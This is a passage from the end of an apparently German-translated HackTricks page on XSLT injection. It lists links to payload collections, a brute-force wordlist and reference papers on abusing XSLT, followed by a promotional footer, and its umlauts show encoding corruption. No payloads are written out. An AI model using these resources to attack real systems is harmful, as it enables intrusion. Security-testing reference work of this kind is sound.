(Beispiel von [http://laurent.bientz.com/Blog/Entry/Item/using\_php\_functions\_in\_xsl-7.sls](http://laurent.bientz.com/Blog/Entry/Item/using\_php\_functions\_in\_xsl-7.sls))

## Weitere Payloads
* √úberpr√ºfen Sie [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSLT%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSLT%20Injection)
* √úberpr√ºfen Sie [https://vulncat.fortify.com/en/detail?id=desc.dataflow.java.xslt_injection](https://vulncat.fortify.com/en/detail?id=desc.dataflow.java.xslt_injection)

## **Brute-Force-Erkennungsliste**

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/xslt.txt" %}

## **Referenzen**

* [XSLT\_SSRF](https://feelsec.info/wp-content/uploads/2018/11/XSLT\_SSRF.pdf)\\
* [http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Abusing%20XSLT%20for%20practical%20attacks%20-%20Arnaboldi%20-%20IO%20Active.pdf](http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Abusing%20XSLT%20for%20practical%20attacks%20-%20Arnaboldi%20-%20IO%20Active.pdf)\\
* [http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Abusing%20XSLT%20for%20practical%20attacks%20-%20Arnaboldi%20-%20Blackhat%202015.pdf](http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Abusing%20XSLT%20for%20practical%20attacks%20-%20Arnaboldi%20-%20Blackhat%202015.pdf)

<details>

<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Arbeiten Sie in einem **Cybersecurity-Unternehmen**? M√∂chten Sie Ihr **Unternehmen in HackTricks bewerben**? Oder m√∂chten Sie Zugriff auf die **neueste Version des PEASS oder HackTricks als PDF-Datei** haben? √úberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* **Treten Sie der** [**üí¨**](https://emojipedia.org/speech-balloon/) [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegramm-Gruppe**](https://t.me/peass) bei oder **folgen** Sie mir auf **Twitter** üê¶[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an das [hacktricks repo](https://github.com/carlospolop/hacktricks) und das [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)** einreichen.

</details>
